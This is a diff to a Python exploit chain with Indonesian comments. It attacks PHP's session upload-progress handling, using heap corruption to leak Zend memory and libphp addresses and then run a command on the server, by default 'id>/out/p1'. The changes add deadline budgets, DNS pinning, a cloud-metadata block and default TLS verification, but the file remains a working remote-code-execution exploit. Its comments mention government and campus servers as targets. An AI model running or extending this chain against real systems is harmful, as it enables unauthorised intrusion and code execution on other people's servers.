@@ -65,6 +65,8 @@ import time
 import urllib.parse
 from collections import Counter
 
+from . import target_policy as _policy
+
 # --------------------------------------------------------------- konstanta --
 
 MAX_CMD = 14  # carrier zend_string 167 byte -> maksimum perintah
@@ -134,6 +136,16 @@ SUPPORTED_109619 = True
 SID = b"attacksessionid0001"
 DEFAULT_CMD = "id>/out/p1"
 
+# Lantai timeout untuk satu operasi jaringan. Deadline 5 ms yang tersisa tidak
+# berguna (TCP handshake saja lebih lama); lebih jujur melempar DeadlineExceeded
+# sebelum request dikirim. 0.1s hanya berlaku bila SISA deadline masih > 0.
+MIN_OP_TIMEOUT = 0.1
+
+# Seam jam untuk deadline. Default = time.monotonic (jam yang sama dengan yang
+# dipakai lib/exploit_runner.py: `Target.deadline` adalah nilai absolut di jam
+# itu). Tes mengganti nama modul ini supaya deadline bisa diuji tanpa sleep.
+_clock = time.monotonic
+
 
 # ---------------------------------------------------------------- payloads --
 
@@ -154,14 +166,39 @@ def build_multipart(parts: list[dict], boundary: bytes) -> bytes:
 
 # ------------------------------------------------------------------ target --
 
+class DeadlineExceeded(RuntimeError):
+    """Batas waktu absolut habis sebelum operasi jaringan dikirim.
+
+    Diekspor dari chain (bukan hanya exploit_runner) karena di sinilah deadline
+    ditegakkan: `Target.op_timeout()` melempar ini saat sisa waktu <= 0, alih-alih
+    mengirim request dengan timeout 90s yang membuat run melewati batas total.
+    """
+
+    def __init__(self, what: str, remaining: float | None = None):
+        self.what = what
+        self.remaining = remaining
+        tail = "" if remaining is None else f" (sisa {remaining:.2f}s)"
+        super().__init__(
+            f"batas waktu total tercapai sebelum {what}{tail}; "
+            "tidak ada request baru dikirim ke target")
+
+
 class Target:
     """Koneksi TCP/TLS mentah supaya bentuk request sama persis dengan PoC.
 
     Tidak memakai curl_cffi: rantai ini butuh kontrol byte-level (kirim body
     bertahap, baca bersamaan dengan upload, biarkan worker abort di tengah).
+
+    Deadline (`deadline`) adalah waktu ABSOLUT di jam `chain._clock`
+    (time.monotonic). Bila ada, SEMUA operasi jaringan (connect, send, recv,
+    jeda) dibatasi sisa waktunya — satu batas untuk seluruh rantai, bukan
+    timeout per-operasi yang bisa dijumlahkan melewati anggaran total.
+    `deadline=None` (default) = perilaku lama, tanpa batas total.
     """
 
-    def __init__(self, url: str, timeout: float = 30.0, verbose: bool = True):
+    def __init__(self, url: str, timeout: float = 30.0, verbose: bool = True,
+                 verify_tls: bool = True, deadline: float | None = None,
+                 allow_private: bool = True):
         u = urllib.parse.urlsplit(url)
         if u.scheme not in ("http", "https"):
             raise ValueError("URL harus http:// atau https://")
@@ -169,8 +206,65 @@ class Target:
         self.host = u.hostname or "127.0.0.1"
         self.port = u.port or (443 if self.https else 80)
         self.path = u.path or "/"
+        # Query string DULU dibuang di sini: Target(".../upload.php?route=debug")
+        # terkirim sebagai "POST /upload.php" — parameter aplikasi (route,
+        # action, dst.) hilang, sehingga stage 1/2/3 menembak handler yang
+        # berbeda dari yang dimaksud operator dan gagal tanpa sebab jelas.
+        self.query = u.query
+        self.request_target = self.path + ("?" + self.query if self.query else "")
         self.timeout = timeout
         self.verbose = verbose
+        # Verifikasi TLS AKTIF secara default. Target dengan CA store tak
+        # lengkap (umum pada server pemerintah/kampus) membutuhkannya
+        # dimatikan secara EKSPLISIT, bukan sebaliknya.
+        self.verify_tls = verify_tls
+        # None = tanpa batas total (kompatibel dengan pemanggil lama).
+        self.deadline = deadline
+        # Rantai (`Chain`) menembak target yang DIKETIK operator (lab lokal
+        # 127.0.0.1/10.x lebih sering daripada host publik), jadi alamat privat
+        # diizinkan di sini seperti sebelumnya — TETAPI endpoint metadata
+        # cloud/IMDS tetap ditolak tanpa syarat oleh `resolve_pinned()`, walau
+        # nilainya True. Yang dikunci di `_connect()` adalah PIN: satu
+        # resolusi, lalu sambung ke IP hasil validasi itu.
+        self.allow_private = bool(allow_private)
+
+    # ---------- deadline ----------
+
+    def remaining(self) -> float | None:
+        """Sisa waktu ke deadline (detik), atau None bila tanpa deadline."""
+        if self.deadline is None:
+            return None
+        return self.deadline - _clock()
+
+    def op_timeout(self, prefer: float) -> float:
+        """Timeout untuk SATU operasi jaringan berikutnya.
+
+        Tanpa deadline: `prefer` apa adanya (perilaku lama, mis. 90s untuk
+        POST stage yang body-nya besar). Dengan deadline: `min(prefer, sisa)`,
+        dengan lantai `MIN_OP_TIMEOUT` — supaya socket tidak diberi timeout 0
+        (mode non-blocking di Python).
+
+        Sisa <= 0 → DeadlineExceeded. Sengaja MELEMPAR, bukan mengembalikan
+        0.1: mengirim request yang pasti habis di tengah jalan menghasilkan
+        laporan \"stage gagal\" yang menyesatkan, padahal payload tidak pernah
+        selesai dikirim.
+        """
+        left = self.remaining()
+        if left is None:
+            return float(prefer)
+        if left <= 0:
+            raise DeadlineExceeded("operasi jaringan", left)
+        return max(min(float(prefer), left), MIN_OP_TIMEOUT)
+
+    @property
+    def host_header(self) -> str:
+        """Nilai header `Host:` — IPv6 literal wajib dibungkus bracket.
+
+        `urlsplit` membuang bracket dari `u.hostname`, jadi tanpa pembungkusan
+        ulang `[::1]:8443` menjadi `::1:8443` yang bukan host:port valid.
+        """
+        host = f"[{self.host}]" if ":" in self.host else self.host
+        return f"{host}:{self.port}"
 
     def log(self, msg: str) -> None:
         if self.verbose:
@@ -178,20 +272,51 @@ class Target:
 
     def _connect(self):
         last = None
+        # Pin DNS dihitung SEKALI untuk seluruh percobaan: kalau tiap retry
+        # me-resolve lagi, jawaban DNS bisa berubah di tengah retry (persis
+        # celah yang ditutup) dan biaya DNS berlipat 10x.
+        pinned_ip: str | None = None
         for _ in range(10):
+            # Tiap percobaan koneksi dibatasi SISA deadline: 10 percobaan ×
+            # timeout 90s = 900s adalah cara paling mudah melewati anggaran
+            # total tanpa satu pun pesan. Sisa habis -> berhenti melempar.
             try:
-                s = socket.create_connection((self.host, self.port),
-                                             timeout=self.timeout)
+                attempt_timeout = self.op_timeout(self.timeout)
+            except DeadlineExceeded as exc:
+                if last is not None:
+                    # Sebab nyata lebih berguna daripada deadline di sini,
+                    # tapi jangan telan: deadline dicatat sebagai cause.
+                    raise last from exc
+                raise
+            try:
+                # DNS rebinding: resolve SEKALI di sini (validasi metadata +
+                # privat ikut dijalankan), lalu sambung ke IP hasilnya. Tanpa
+                # ini `create_connection(self.host, ...)` akan me-resolve ulang
+                # nama dan bisa mendarat di alamat yang belum divalidasi.
+                # `PolicyError` (ValueError) sengaja TIDAK ditangkap di sini:
+                # blokir kebijakan bukan gangguan jaringan yang layak di-retry.
+                # `ResolveError` turunan OSError -> ikut jalur retry biasa.
+                if pinned_ip is None:
+                    pinned_ip = _policy.resolve_pinned(
+                        self.host, self.port, allow_private=self.allow_private
+                    )
+                s = socket.create_connection((pinned_ip, self.port),
+                                             timeout=attempt_timeout)
                 if self.https:
                     # Rantai berjalan lewat soket mentah, jadi TLS diatur di sini.
-                    # check_hostname=False saja TIDAK cukup: itu hanya mematikan
-                    # pencocokan nama, verifikasi rantai sertifikat tetap jalan.
-                    # Akibatnya target nyata dengan CA store tak lengkap (umum pada
-                    # server pemerintah/kampus) gagal di SSLCertVerificationError
-                    # sebelum satu byte pun payload terkirim.
+                    # Verifikasi AKTIF default (CERT_REQUIRED + check_hostname):
+                    # melewati verifikasi bukan hak default sebuah tool, meski
+                    # target dengan CA store tak lengkap lebih repot. Operator
+                    # lab mematikannya eksplisit lewat verify_tls=False.
                     ctx = ssl.create_default_context()
-                    ctx.check_hostname = False
-                    ctx.verify_mode = ssl.CERT_NONE
+                    if self.verify_tls:
+                        ctx.check_hostname = True
+                        ctx.verify_mode = ssl.CERT_REQUIRED
+                    else:
+                        # check_hostname harus dimatikan DULU: menyetel
+                        # CERT_NONE saat check_hostname True melempar ValueError.
+                        ctx.check_hostname = False
+                        ctx.verify_mode = ssl.CERT_NONE
                     s = ctx.wrap_socket(s, server_hostname=self.host)
                 try:
                     s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
@@ -200,7 +325,12 @@ class Target:
                 return s
             except OSError as e:
                 last = e
-                time.sleep(0.3)
+                # Jeda retry juga kena deadline: 10 × 0.3s bukan jumlah besar,
+                # tapi prinsipnya sama — tidak ada tunggu tanpa anggaran.
+                left = self.remaining()
+                if left is not None and left <= 0:
+                    raise DeadlineExceeded("koneksi ke target", left) from e
+                time.sleep(0.3 if left is None else min(0.3, left))
         raise last  # type: ignore[misc]
 
     def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
@@ -210,16 +340,22 @@ class Target:
         for k, v in (extra_headers or {}).items():
             extra += f"{k}: {v}\r\n"
         hdr = (
-            f"POST {self.path} HTTP/1.1\r\n"
-            f"Host: {self.host}:{self.port}\r\n"
+            f"POST {self.request_target} HTTP/1.1\r\n"
+            f"Host: {self.host_header}\r\n"
             f"{extra}"
             f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
             f"Content-Length: {len(body)}\r\n"
             "Connection: close\r\n"
             "\r\n"
         ).encode()
+        # Timeout dasar operasi ini = min(prefer, sisa deadline). Dipakai ulang
+        # per potongan body supaya satu upload 16 MB tidak bisa berjalan 64×
+        # lebih lama dari anggaran (sendall per 256 KB masing-masing timeout
+        # penuh). Sisa habis -> DeadlineExceeded, bukan kirim lalu gagal.
+        base = timeout or self.timeout
+        eff = self.op_timeout(base)
         s = self._connect()
-        s.settimeout(timeout or self.timeout)
+        s.settimeout(eff)
 
         # Baca BERBARENGAN dengan upload: sebagian request membuat worker abort
         # tepat setelah mengirim Set-Cookie; recv() yang baru mulai setelah RST
@@ -229,6 +365,11 @@ class Target:
         def _reader() -> None:
             try:
                 while len(data) < read_cap:
+                    left = self.remaining()
+                    if left is not None and left <= 0:
+                        break          # deadline: berhenti membaca, jangan tunggu
+                    if left is not None:
+                        s.settimeout(max(min(eff, left), MIN_OP_TIMEOUT))
                     chunk = s.recv(65536)
                     if not chunk:
                         break
@@ -243,28 +384,51 @@ class Target:
                 s.sendall(hdr)
                 mv = memoryview(body)
                 for off in range(0, len(body), 262144):
+                    # Re-arm setiap potongan: timeout per-sendall yang tidak
+                    # diperbarui adalah celah yang membuat run melewati
+                    # max_total_timeout walau tiap operasi "punya timeout".
+                    s.settimeout(self.op_timeout(eff))
                     s.sendall(mv[off:off + 262144])
             except OSError:
                 pass  # worker boleh abort saat body masih dikirim
-            reader.join(timeout=(timeout or self.timeout) + 1.0)
+            left = self.remaining()
+            join_s = (eff + 1.0) if left is None else max(min(eff + 1.0, left), 0.0)
+            reader.join(timeout=join_s)
             return bytes(data)
         finally:
             s.close()
 
-    def get(self, path: str, read_cap: int = 1 << 20) -> tuple[int, bytes]:
+    def get(self, path: str | None = None,
+            read_cap: int = 1 << 20) -> tuple[int, bytes]:
+        """GET satu path. `path=None` memakai path+query dari URL target.
+
+        Dulu query string URL tidak pernah ikut ke request line, sehingga
+        `Target("https://h/upload.php?route=debug").get()` menembak
+        `/upload.php` — handler berbeda. Path eksplisit tetap dipakai apa
+        adanya (pemanggil yang menentukan).
+        """
+        target = self.request_target if not path else path
         hdr = (
-            f"GET {path} HTTP/1.1\r\n"
-            f"Host: {self.host}:{self.port}\r\n"
+            f"GET {target} HTTP/1.1\r\n"
+            f"Host: {self.host_header}\r\n"
             "Connection: close\r\n"
             "\r\n"
         ).encode()
         s = self._connect()
-        s.settimeout(self.timeout)
+        s.settimeout(self.op_timeout(self.timeout))
         try:
             s.sendall(hdr)
             data = bytearray()
             try:
                 while len(data) < read_cap:
+                    # Baca juga kena deadline: satu recv dibatasi sisa waktu,
+                    # tapi loop-nya bisa berulang. Tanpa cek ini, GET bukti
+                    # (out/p1) boleh terus membaca setelah anggaran habis.
+                    left = self.remaining()
+                    if left is not None and left <= 0:
+                        break
+                    if left is not None:
+                        s.settimeout(max(min(self.timeout, left), MIN_OP_TIMEOUT))
                     chunk = s.recv(65536)
                     if not chunk:
                         break
@@ -369,6 +533,22 @@ class Chain:
     def _file_part(self) -> dict:
         return {"name": "f", "filename": "a.txt", "data": b"A" * 64}
 
+    def _pause(self, seconds: float) -> None:
+        """Jeda antar-request yang IKUT anggaran deadline.
+
+        Tanpa deadline: perilaku lama (tidur penuh). Dengan deadline: durasi
+        dipotong sisa waktu, dan bila sisa sudah habis -> DeadlineExceeded.
+        Kalau tidak dipotong, `rotate()` (0.3s + 0.5s) × 8 panggilan bisa
+        menambah 6s melewati max_total_timeout tanpa satu pun request.
+        """
+        left = self.t.remaining()
+        if left is None:
+            time.sleep(seconds)
+            return
+        if left <= 0:
+            raise DeadlineExceeded("jeda antar-request", left)
+        time.sleep(min(seconds, left))
+
     def rotate(self) -> None:
         """Abort worker lewat HTTP; prefork mem-fork worker baru."""
         self.t.log("[*] rotasi worker lewat HTTP")
@@ -381,16 +561,17 @@ class Chain:
             self._big_field(),
         ]
         self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
-                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
-        time.sleep(0.3)
+                    read_cap=1 << 20,
+                    timeout=self.t.op_timeout(max(90.0, self.t.timeout)))
+        self._pause(0.3)
         # B tanpa file part: cleanup pre-RINIT menelusuri heap rusak -> abort
         parts = [
             {"name": "PHPSESSID", "data": SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
         ]
         self.t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345",
-                    read_cap=65536, timeout=20.0)
-        time.sleep(0.5)
+                    read_cap=65536, timeout=self.t.op_timeout(20.0))
+        self._pause(0.5)
 
     def stage1(self) -> int:
         """Bocorkan Zend MM chunk base."""
@@ -402,8 +583,9 @@ class Chain:
             self._big_field(),
         ]
         self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
-                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
-        time.sleep(0.2)
+                    read_cap=1 << 20,
+                    timeout=self.t.op_timeout(max(90.0, self.t.timeout)))
+        self._pause(0.2)
 
         parts = [
             {"name": "PHPSESSID", "data": SID},
@@ -418,7 +600,8 @@ class Chain:
         parts.append({"name": "1999", "data": bytes(forge)})
 
         resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
-                           read_cap=9 << 20)
+                           read_cap=9 << 20,
+                           timeout=self.t.op_timeout(self.t.timeout))
         return chunk_base_from_cookie(parse_cookie(resp))
 
     def stage2(self) -> int:
@@ -432,8 +615,9 @@ class Chain:
             self._big_field(),
         ]
         self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
-                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
-        time.sleep(0.2)
+                    read_cap=1 << 20,
+                    timeout=self.t.op_timeout(max(90.0, self.t.timeout)))
+        self._pause(0.2)
 
         parts = [
             {"name": "PHPSESSID", "data": SID},
@@ -446,7 +630,8 @@ class Chain:
                               "data": b"x" * self.stage2_v})
 
         resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
-                           read_cap=1 << 20)
+                           read_cap=1 << 20,
+                           timeout=self.t.op_timeout(self.t.timeout))
         return libphp_base_from_cookie(parse_cookie(resp), self.dtor_offset)
 
     def _fake_payload(self, htdata: int, zif: int) -> tuple[bytes, bytes]:
@@ -511,9 +696,10 @@ class Chain:
             # di R0+16 (yang akan menimpa val.type).
             extra = {"Cookie": "PHPSESSID=" + "a" * 32}
         self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
-                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
+                    read_cap=1 << 20,
+                    timeout=self.t.op_timeout(max(90.0, self.t.timeout)),
                     extra_headers=extra)
-        time.sleep(0.3)
+        self._pause(0.3)
 
         ht, ref = self._fake_payload(htdata, zif)
         parts = [
@@ -537,4 +723,4 @@ class Chain:
             for i in range(2):
                 parts.append({"name": f"f{i:02d}", "data": ref})
         self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
-                    read_cap=65536, timeout=30.0)
+                    read_cap=65536, timeout=self.t.op_timeout(30.0))
